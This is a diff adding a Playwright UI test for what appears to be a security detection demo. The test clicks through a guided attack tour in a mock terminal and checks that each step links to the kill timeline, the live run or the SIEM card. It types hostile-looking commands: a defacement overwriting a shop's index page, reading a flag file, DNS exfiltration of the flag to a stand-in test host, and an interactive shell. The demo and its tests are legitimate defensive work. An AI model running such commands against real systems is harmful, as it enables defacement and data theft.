@@ -406,6 +406,70 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     expect(problems).toEqual([]);
   });
 
+  test("every step's button goes somewhere visible: the terminal, this session's kill timeline, the live run, the SIEM's card; none offers a target that is gone", async ({ page, isMobile }) => {
+    test.setTimeout(90_000);
+    const problems = guardConsole(page);
+    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=3000");
+    const bar = page.locator("#tour .tour");
+    const steps = page.locator("#tour-steps");
+    const term = page.locator("#terminal");
+    const input = term.locator("#term-input");
+    if (isMobile) await bar.getByRole("button", { name: "Show the steps" }).click();
+    const current = (id: string) => steps.locator(`.tour__step[data-id="${id}"][data-current="true"]`);
+    const run = async (cmd: string) => {
+      await expect(input).toHaveValue(cmd);
+      await expect(input).toBeEnabled({ timeout: 10_000 });
+      await input.press("Enter");
+    };
+    // 1: the button opens the terminal with the command picked and the terminal in view.
+    await page.evaluate(() => scrollTo(0, 0));
+    await current("look").getByRole("button", { name: "Do this step" }).click();
+    await expect(term.locator(".term__grid")).toBeInViewport();
+    await run("id");
+    await expect(steps.locator('.tour__step[data-id="look"]')).toHaveAttribute("data-done", "true");
+    // 2: the deface, then the flag.
+    await current("tamper").getByRole("button", { name: "Do this step" }).click();
+    await run("echo pwned>/srv/shop/index.html;echo '{\"status\":\"defaced\"}'>/srv/shop/state.json");
+    await expect(input).toBeEnabled({ timeout: 10_000 });
+    await term.getByRole("button", { name: "cat /srv/shop/.flag" }).click();
+    await expect(steps.locator('.tour__step[data-id="tamper"]')).toHaveAttribute("data-done", "true");
+    // 3: the DNS trick.
+    await current("hide").getByRole("button", { name: "Do this step" }).click();
+    await run("nslookup sdp-<flag>.x.exfil.sdp.test.");
+    await expect(steps.locator('.tour__step[data-id="hide"]')).toHaveAttribute("data-done", "true");
+    // 4: the shell; caught; its done button shows this session's kill timeline.
+    await current("caught").getByRole("button", { name: "Do this step" }).click();
+    await run("sh -i");
+    await expect(term.locator(".term__summary")).toBeVisible({ timeout: 15_000 });
+    const watch = steps.locator('.tour__step[data-id="caught"]').getByRole("button", { name: "Watch the kill timeline" });
+    await expect(watch).toBeVisible();
+    await watch.click();
+    await expect(term.locator(".thisrun__timelinewrap")).toBeFocused();
+    await expect(term.locator(".thisrun__timelinewrap")).toBeInViewport();
+    await expect(term.locator(".thisrun__timeline")).toContainText("Talon deleted the pod");
+    // 5: side by side; its done button puts that run in the live-run console and goes there.
+    await current("compare").getByRole("button", { name: "Launch side by side" }).click();
+    await expect(steps.locator('.tour__step[data-id="compare"]')).toHaveAttribute("data-done", "true", { timeout: 20_000 });
+    const show = steps.locator('.tour__step[data-id="compare"]').getByRole("button", { name: "Show the live run" });
+    await expect(show).toBeVisible();
+    await show.click();
+    await expect(page.locator("#console-title")).toBeFocused();
+    await expect(page.locator("#console-title")).toBeInViewport();
+    await expect(page.locator("#console")).not.toHaveAttribute("data-state", "empty");
+    await expect(page.locator("#console .console__run")).toHaveCount(1);
+    // 6: the SIEM's incident; its button opens the correlation on the card.
+    await expect(steps.locator('.tour__step[data-id="siem"]')).toHaveAttribute("data-done", "true", { timeout: 20_000 });
+    await steps.locator('.tour__step[data-id="siem"]').getByRole("link", { name: "Show in SIEM" }).click();
+    await expect(page.locator("#correlation .section__toggle")).toHaveAttribute("aria-expanded", "true");
+    await expect(page.locator("#correlation .incident--own").first()).toBeInViewport();
+    // Back on the start panel the session's timeline is gone, and so is the button that would show it.
+    await term.getByRole("button", { name: "Run another session" }).click();
+    await expect(term.locator(".term-start")).toBeVisible();
+    await expect(steps.locator('.tour__step[data-id="caught"]').getByRole("button", { name: "Watch the kill timeline" })).toHaveCount(0);
+    await expect(show).toBeVisible();
+    expect(problems).toEqual([]);
+  });
+
   test("on a wide screen the attack section widens: the terminal and This run left, the tour's rail right, the commands across both; the sticky panel is never cut at its top", async ({ page, isMobile }) => {
     test.skip(isMobile, "the wide layout is a desktop layout");
     for (const [width, height] of [
